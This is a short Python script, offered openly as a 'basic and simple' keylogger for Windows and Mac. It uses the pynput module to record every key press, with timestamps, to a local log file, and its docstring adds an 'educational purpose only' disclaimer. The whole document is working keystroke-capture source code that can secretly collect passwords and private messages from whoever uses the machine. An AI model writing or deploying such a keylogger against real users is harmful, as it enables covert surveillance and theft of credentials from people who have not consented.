"""
A basic and simple python keylogger for Windows/Mac/PC (modify the path/code based on your needs)

Requirement : pynput external module (https://github.com/moses-palmer/pynput)
Basic python keylogger(version 1): https://www.youtube.com/watch?v=x8GbWt56TlY

This is for educational purpose only,
please don't misuse for malicious/illegal purpose!

DISCLAIMER :The creator of this script take no responsibility for any purposes regarding the usage of the script.
"""

from pynput.keyboard import Key, Listener
import logging

log_path = "." #modify where you want to put the path (use ABSOLUTE PATH)

logging.basicConfig(filename=(log_path + "/cS_logv1.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_type(key):
    logging.info(key)

with Listener(on_press=on_type) as listener:
    listener.join()
